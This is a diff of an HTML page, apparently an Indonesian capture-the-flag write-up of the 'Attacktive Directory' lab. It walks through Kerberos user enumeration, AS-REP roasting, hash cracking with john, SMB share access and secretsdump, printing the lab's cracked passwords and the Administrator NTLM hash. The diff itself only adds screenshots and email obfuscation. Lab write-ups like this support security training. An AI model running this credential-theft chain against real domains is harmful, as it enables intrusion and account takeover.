@@ -617,6 +617,13 @@
           <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
           <pre><span class="cmd">nmap</span> <span class="param">-p- -sV -sC --min-rate 5000</span> <span class="ip">10.48.186.111</span></pre>
         </div>
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — nmap scan output
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_13_17_15.png" alt="nmap scan" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
+        </div>
         <div class="callout info">
           <span class="callout-icon">ℹ️</span>
           <div>Dari output nmap ditemukan: <strong>NetBIOS-Domain Name: THM-AD</strong>, domain <strong>spookysec.local</strong>, dan Windows Server 2019.</div>
@@ -650,6 +657,13 @@
           <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
           <pre><span class="cmd">kerbrute</span> userenum <span class="param">--dc</span> <span class="ip">10.48.186.111</span> <span class="param">-d</span> spookysec.local userlist.txt</pre>
         </div>
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — kerbrute valid users
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_13_37_14.png" alt="kerbrute output" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
+        </div>
         <div class="callout tip">
           <span class="callout-icon">💡</span>
           <div>Dua akun yang paling menarik: <strong style="color:var(--accent)">svc-admin</strong> (service account) dan <strong style="color:var(--accent)">backup</strong> (backup account untuk DC).</div>
@@ -677,16 +691,38 @@
           <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
           <pre><span class="cmd">impacket-GetNPUsers</span> spookysec.local/ <span class="param">-usersfile</span> userlist.txt <span class="param">-no-pass -dc-ip</span> <span class="ip">10.48.186.111</span></pre>
         </div>
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — GetNPUsers scanning users
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_18_18_01.png" alt="GetNPUsers scan" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
+        </div>
         <p>Hash berhasil didapat dari akun <inline-code>svc-admin</inline-code>:</p>
         <div class="code-block">
           <div class="code-header"><span class="code-lang">HASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
-          <pre><span class="hash">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:b2bf19c28264b4dc8e22cecd8f176551$86adc3eee89a...</span></pre>
+          <pre><span class="hash"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d2f6b9a0b0e7b3a1a0b7a2f6e0e1f6a1a4b1ffb3b6bfbbbc9281829d9d998b819791fc9e9d91939e">[email&#160;protected]</a>:b2bf19c28264b4dc8e22cecd8f176551$86adc3eee89a...</span></pre>
+        </div>
+
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — hash AS-REP ditemukan
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_18_18_38.png" alt="ASREPRoast hash" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
         </div>
 
         <h3>Crack Hash dengan John</h3>
         <div class="code-block">
           <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
           <pre><span class="cmd">john</span> <span class="param">--wordlist=</span>passwordlist.txt hash.txt</pre>
+        </div>
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — john berhasil crack password
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_18_25_51.png" alt="john crack result" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
         </div>
         <div class="callout tip">
           <span class="callout-icon">🎉</span>
@@ -715,6 +751,13 @@
           <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
           <pre><span class="cmd">smbclient</span> <span class="param">-L</span> //<span class="ip">10.48.186.111</span> <span class="param">-U</span> svc-admin%management2005</pre>
         </div>
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — SMB shares + backup_credentials.txt
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_18_28_38.png" alt="smbclient shares" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
+        </div>
 
         <h3>Akses Share backup</h3>
         <div class="code-block">
@@ -725,7 +768,14 @@ smb: \> <span class="cmd">exit</span>
 <span class="cmd">cat</span> backup_credentials.txt
 <span class="comment"># Output: YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</span>
 <span class="cmd">echo</span> <span class="param">"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw"</span> | <span class="cmd">base64 -d</span>
-<span class="success"># backup@spookysec.local:backup2517860</span></pre>
+<span class="success"># <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="85e7e4e6eef0f5c5f6f5eaeaeefcf6e0e6abe9eae6e4e9">[email&#160;protected]</a>:backup2517860</span></pre>
+        </div>
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — base64 decode backup credentials
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_18_34_24.png" alt="base64 decode" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
         </div>
         <div class="callout warning">
           <span class="callout-icon">⚠️</span>
@@ -738,7 +788,7 @@ smb: \> <span class="cmd">exit</span>
           <tr><td>Jumlah remote shares</td><td><span class="answer-val">6</span></td></tr>
           <tr><td>Share yang bisa diakses</td><td><span class="answer-val">backup</span></td></tr>
           <tr><td>Isi file (encoded)</td><td><span class="answer-val">YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</span></td></tr>
-          <tr><td>Isi file (decoded)</td><td><span class="answer-val">backup@spookysec.local:backup2517860</span></td></tr>
+          <tr><td>Isi file (decoded)</td><td><span class="answer-val"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="751714161e00053506051a1a1e0c0610165b191a161419">[email&#160;protected]</a>:backup2517860</span></td></tr>
         </table>
       </div>
     </section>
@@ -758,6 +808,13 @@ smb: \> <span class="cmd">exit</span>
           <pre><span class="cmd">impacket-secretsdump</span> <span class="param">-just-dc</span> backup:backup2517860@<span class="ip">10.48.186.111</span></pre>
         </div>
         <p>Hash Administrator berhasil didapat:</p>
+        <div class="screenshot">
+          <div class="screenshot-header">
+            <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+            terminal — secretsdump semua hash domain
+          </div>
+          <img src="assets/img/posts/attacktive/VirtualBox_KaliLinux2026_11_03_2026_18_39_46.png" alt="secretsdump output" onerror="this.parentElement.innerHTML='<div class=screenshot-placeholder>[ screenshot tidak ditemukan ]</div>'" />
+        </div>
         <div class="code-block">
           <div class="code-header"><span class="code-lang">OUTPUT</span><button class="copy-btn" onclick="copyCode(this)">COPY</button></div>
           <pre>Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="hash">0e0363213e37b94221497260b0bcb4fc</span>:::
@@ -825,7 +882,7 @@ smb: \> <span class="cmd">exit</span>
   <p style="margin-top:0.5rem;">© 2026 <span class="accent">Roynaldo Rangga Kusuma</span> — ADBasic Enumeration IDN</p>
 </footer>
 
-<script>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
   function toggleTask(header) {
     const body = header.nextElementSibling;
     const toggle = header.querySelector('.task-toggle');
@@ -845,18 +902,3 @@ smb: \> <span class="cmd">exit</span>
 
   const sections = document.querySelectorAll('.task-section');
   const tocLinks = document.querySelectorAll('.toc-list a');
-
-  const observer = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if (entry.isIntersecting) {
-        tocLinks.forEach(link => link.classList.remove('active'));
-        const activeLink = document.querySelector(`.toc-list a[href="#${entry.target.id}"]`);
-        if (activeLink) activeLink.classList.add('active');
-      }
-    });
-  }, { threshold: 0.3 });
-
-  sections.forEach(s => observer.observe(s));
-</script>
-</body>
-</html>
